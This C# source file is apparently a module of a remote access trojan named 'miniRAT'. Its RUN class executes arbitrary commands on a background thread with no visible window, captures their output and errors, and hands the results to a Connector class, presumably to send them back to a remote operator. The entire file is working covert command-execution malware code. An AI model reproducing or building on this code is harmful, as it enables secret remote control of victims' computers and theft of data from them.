using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace miniRAT
{/// <summary>
/// Run cmd command
/// </summary>
    class RUN
    {
        #region Run Command
        /// <summary>
        /// Run a process or CMD command command in hidden mode and return results of command.
        /// </summary>
        /// <param name="commnd">command and parameters to run.</param>
        public static string runThread(string commnd, string parameters = null)
        {
            Thread rthread = new Thread(() => run(commnd, parameters));
            rthread.IsBackground = true;
            rthread.Start();
            return string.Format("\nsend command >> {0}\n", parameters);
        }

        /// <summary>
        /// Run a process or CMD command command in hidden mode and return results of command.
        /// </summary>
        /// <param name="commnd">command and parameters to run.</param>
        /// <returns>results of cmd command.</returns>
        static void run(string commnd, string parameters = null)
        {
            var result = new StringBuilder();
            var error = new StringBuilder();

            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run, and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows, and then exit.
                //ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + parameter);
                ProcessStartInfo procStartInfo = new ProcessStartInfo(commnd, parameters);
                //procStartInfo.UseShellExecute = false;
                // The following commands are needed to redirect the standard output.
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.RedirectStandardError = true;
                procStartInfo.RedirectStandardInput = true;
                procStartInfo.UseShellExecute = false;
                // Do not create the black window.
                procStartInfo.CreateNoWindow = true;
                // Now we create a process, assign its ProcessStartInfo and start it
                Process proc = new Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                //result = proc.StandardOutput.ReadToEnd();//read output
                //error = proc.StandardError.ReadToEnd();

                /*if (!proc.WaitForExit(timeout))//TimeOut
                {
                    proc.Kill(); //don't need it kill after read to end
                    result += string.Format("Run Command {0} TimeOut>> {1} ,mili secound elapsed. {2}",
                        commnd, timeout.ToString(), result);
                }
                 else
                 { // Get the output into a string, if timeout no 
                    // result = proc.StandardOutput.ReadToEnd();

                 }*/
                proc.ErrorDataReceived += delegate (object sender, DataReceivedEventArgs errorLine)
                {
                    if (errorLine.Data != null) result.AppendLine(errorLine.Data);

                };
                proc.OutputDataReceived += delegate (object sender, DataReceivedEventArgs outputLine)
                {
                    if (outputLine.Data != null) result.AppendLine(outputLine.Data);

                };

                proc.BeginErrorReadLine();
                proc.BeginOutputReadLine();
                proc.WaitForExit();

                if (string.IsNullOrEmpty(result.ToString() + error.ToString()))
                    result.AppendLine(commnd + " done, but NO results or error.");

                Connector.SendData(result + " " + error);
            }
            catch (Exception objException)
            {
                Connector.SendData("Error in run command " + commnd + objException.Message);
            }

        }
        #endregion
    }
}

